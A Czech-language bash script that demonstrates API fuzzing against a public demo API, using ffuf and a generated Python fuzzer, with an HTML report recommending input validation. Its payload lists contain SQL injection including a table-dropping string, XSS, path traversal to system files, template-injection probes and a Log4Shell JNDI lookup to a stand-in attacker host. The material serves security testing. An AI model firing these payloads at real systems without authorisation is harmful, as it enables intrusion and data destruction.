#!/bin/bash

# Demo script pro API fuzzing
# Použití: ./fuzzing_demo.sh

# set -e

echo "🔍 API Fuzzing Demo Script"
echo "=========================="

# Konfigurace
TARGET_URL="https://jsonplaceholder.typicode.com"
WORDLIST_DIR="./wordlists"
RESULTS_DIR="./fuzzing_results"

# Vytvoření adresářů
mkdir -p "$WORDLIST_DIR"
mkdir -p "$RESULTS_DIR"

echo "📁 Příprava wordlistů..."

# Vytvoření základního wordlistu pro endpointy
cat > "$WORDLIST_DIR/endpoints.txt" << 'EOF'
users
posts
comments
albums
photos
todos
admin
api
v1
v2
config
health
status
metrics
docs
swagger
openapi.json
.env
backup
test
debug
login
logout
register
profile
settings
dashboard
EOF

# Vytvoření wordlistu pro parametry
cat > "$WORDLIST_DIR/parameters.txt" << 'EOF'
id
user_id
username
email
password
token
api_key
limit
offset
page
sort
order
filter
search
q
query
format
callback
jsonp
debug
test
admin
EOF

# Vytvoření payloadů pro injection testy
cat > "$WORDLIST_DIR/injection_payloads.txt" << 'EOF'
' OR '1'='1
'; DROP TABLE users; --
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
../../../etc/passwd
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
${jndi:ldap://evil.com/a}
{{7*7}}
<%=7*7%>
#{7*7}
${{7*7}}
EOF

echo "🚀 Spouštím fuzzing testy..."

# Funkce pro ffuf fuzzing
run_ffuf_test() {
    local test_name="$1"
    local url="$2"
    local wordlist="$3"
    local output_file="$4"
    local additional_args="$5"
    
    echo "  🔍 $test_name..."
    
    if command -v ffuf >/dev/null 2>&1; then
        ffuf -w "$wordlist" -u "$url" \
             -o "$output_file" -of json \
             -t 10 -rate 100 \
             -fc 404 -fs 0 \
             $additional_args 

        if [ -f "$output_file" ]; then
            local results_count=$(jq '.results | length' "$output_file" 2>/dev/null || echo "0")
            echo "    ✅ Dokončeno - nalezeno $results_count výsledků"
        else
            echo "    ❌ Chyba při generování výsledků"
        fi
    else
        echo "    ⚠️  ffuf není nainstalován, přeskakuji test"
        echo "    💡 Instalace: go install github.com/ffuf/ffuf@latest"
    fi
}

# Test 1: Directory/Endpoint fuzzing
run_ffuf_test \
    "Directory Fuzzing" \
    "$TARGET_URL/FUZZ" \
    "$WORDLIST_DIR/endpoints.txt" \
    "$RESULTS_DIR/directory_fuzzing.json"

# Test 2: Parameter fuzzing
run_ffuf_test \
    "Parameter Fuzzing" \
    "$TARGET_URL/users?FUZZ=test" \
    "$WORDLIST_DIR/parameters.txt" \
    "$RESULTS_DIR/parameter_fuzzing.json"

# Test 3: POST data fuzzing
run_ffuf_test \
    "POST Data Fuzzing" \
    "$TARGET_URL/users" \
    "$WORDLIST_DIR/injection_payloads.txt" \
    "$RESULTS_DIR/post_fuzzing.json" \
    "-X POST -H 'Content-Type: application/json' -d '{\"name\":\"FUZZ\",\"email\":\"test@example.com\"}'"

# Test 4: Header fuzzing
run_ffuf_test \
    "Header Fuzzing" \
    "$TARGET_URL/users" \
    "$WORDLIST_DIR/parameters.txt" \
    "$RESULTS_DIR/header_fuzzing.json" \
    "-H 'X-FUZZ: test'"

echo ""
echo "🐍 Spouštím Python fuzzing testy..."

# Python fuzzing script
cat > "$RESULTS_DIR/python_fuzzer.py" << 'EOF'
#!/usr/bin/env python3
import requests
import json
import time
import random
from typing import List, Dict, Any

class APIFuzzer:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'API-Fuzzer/1.0'
        })
        self.results = []
    
    def fuzz_parameters(self, endpoint: str, params: List[str], payloads: List[str]):
        """Fuzzing URL parametrů"""
        print(f"  🔍 Fuzzing parametrů pro {endpoint}")
        
        for param in params:
            for payload in payloads:
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={param: payload}
                    )
                    
                    result = {
                        'type': 'parameter',
                        'endpoint': endpoint,
                        'parameter': param,
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'response_time': response.elapsed.total_seconds()
                    }
                    
                    # Detekce anomálií
                    if (response.status_code not in [200, 404, 400] or 
                        response.elapsed.total_seconds() > 5 or
                        len(response.text) > 10000):
                        result['anomaly'] = True
                        print(f"    🚨 Anomálie: {param}={payload} -> {response.status_code}")
                    
                    self.results.append(result)
                    
                except Exception as e:
                    print(f"    ❌ Chyba: {param}={payload} -> {str(e)}")
                
                time.sleep(0.1)  # Rate limiting
    
    def fuzz_json_data(self, endpoint: str, fields: List[str], payloads: List[str]):
        """Fuzzing JSON dat"""
        print(f"  🔍 Fuzzing JSON dat pro {endpoint}")
        
        for field in fields:
            for payload in payloads:
                try:
                    data = {field: payload, "email": "test@example.com"}
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data
                    )
                    
                    result = {
                        'type': 'json_data',
                        'endpoint': endpoint,
                        'field': field,
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'response_time': response.elapsed.total_seconds()
                    }
                    
                    # Detekce anomálií
                    if (response.status_code == 500 or 
                        'error' in response.text.lower() or
                        payload in response.text):
                        result['anomaly'] = True
                        print(f"    🚨 Anomálie: {field}={payload} -> {response.status_code}")
                    
                    self.results.append(result)
                    
                except Exception as e:
                    print(f"    ❌ Chyba: {field}={payload} -> {str(e)}")
                
                time.sleep(0.1)
    
    def generate_random_payloads(self, count: int = 50) -> List[str]:
        """Generování náhodných payloadů"""
        payloads = []
        
        for _ in range(count):
            # Náhodné stringy
            length = random.randint(1, 1000)
            chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
            payload = ''.join(random.choice(chars) for _ in range(length))
            payloads.append(payload)
        
        return payloads
    
    def run_fuzzing(self):
        """Spuštění fuzzing testů"""
        print("🐍 Python API Fuzzer")
        
        # Základní payloady
        injection_payloads = [
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "A" * 1000,  # Buffer overflow test
            "\x00\x01\x02\x03",  # Binary data
            "🚀🔥💥",  # Unicode
        ]
        
        # Fuzzing parametrů
        self.fuzz_parameters(
            "/users",
            ["id", "name", "email", "search"],
            injection_payloads
        )
        
        # Fuzzing JSON dat
        self.fuzz_json_data(
            "/users",
            ["name", "username", "email"],
            injection_payloads
        )
        
        # Fuzzing s náhodnými daty
        random_payloads = self.generate_random_payloads(20)
        self.fuzz_parameters("/users", ["id"], random_payloads)
        
        # Uložení výsledků
        with open('python_fuzzing_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Statistiky
        total_tests = len(self.results)
        anomalies = len([r for r in self.results if r.get('anomaly', False)])
        
        print(f"  📊 Celkem testů: {total_tests}")
        print(f"  🚨 Anomálií: {anomalies}")
        
        return self.results

if __name__ == "__main__":
    fuzzer = APIFuzzer("https://jsonplaceholder.typicode.com")
    fuzzer.run_fuzzing()
EOF

# Spuštění Python fuzzeru
if command -v python3 >/dev/null 2>&1; then
    cd "$RESULTS_DIR"
    python3 python_fuzzer.py
    cd ..
else
    echo "  ⚠️  Python3 není nainstalován, přeskakuji Python fuzzing"
fi

echo ""
echo "📊 Generuji souhrnný report..."

# Generování HTML reportu
cat > "$RESULTS_DIR/fuzzing_report.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>API Fuzzing Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #f0f0f0; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; }
        .anomaly { background: #ffe6e6; padding: 10px; border-left: 4px solid #ff0000; }
        .normal { background: #e6ffe6; padding: 10px; border-left: 4px solid #00ff00; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔍 API Fuzzing Report</h1>
        <p>Datum: $(date)</p>
        <p>Cíl: https://jsonplaceholder.typicode.com</p>
    </div>
    
    <div class="section">
        <h2>📋 Shrnutí testů</h2>
        <ul>
            <li>Directory Fuzzing: Testování existujících endpointů</li>
            <li>Parameter Fuzzing: Testování URL parametrů</li>
            <li>POST Data Fuzzing: Testování JSON payloadů</li>
            <li>Header Fuzzing: Testování HTTP headerů</li>
            <li>Python Fuzzing: Pokročilé testování s anomálie detekcí</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>🚨 Doporučení</h2>
        <div class="anomaly">
            <h3>Bezpečnostní opatření:</h3>
            <ul>
                <li>Implementujte input validaci pro všechny parametry</li>
                <li>Používejte prepared statements proti SQL injection</li>
                <li>Escapujte výstup proti XSS útokům</li>
                <li>Implementujte rate limiting</li>
                <li>Logujte podezřelé aktivity</li>
            </ul>
        </div>
    </div>
    
    <div class="section">
        <h2>📁 Soubory s výsledky</h2>
        <ul>
            <li>directory_fuzzing.json - Výsledky directory fuzzingu</li>
            <li>parameter_fuzzing.json - Výsledky parameter fuzzingu</li>
            <li>post_fuzzing.json - Výsledky POST data fuzzingu</li>
            <li>header_fuzzing.json - Výsledky header fuzzingu</li>
            <li>python_fuzzing_results.json - Výsledky Python fuzzingu</li>
        </ul>
    </div>
</body>
</html>
EOF

echo "✅ Fuzzing dokončen!"
echo ""
echo "📁 Výsledky uloženy v: $RESULTS_DIR/"
echo "📄 HTML report: $RESULTS_DIR/fuzzing_report.html"
echo ""
echo "🔧 Nástroje použité:"
echo "  - ffuf (pokud je nainstalován)"
echo "  - Python3 custom fuzzer"
echo ""
echo "💡 Pro instalaci ffuf:"
echo "  go install github.com/ffuf/ffuf@latest"
echo ""
echo "⚠️  Poznámka: Tento script je pouze pro demonstrační účely!"
echo "   Používejte pouze na vlastních nebo autorizovaných systémech."
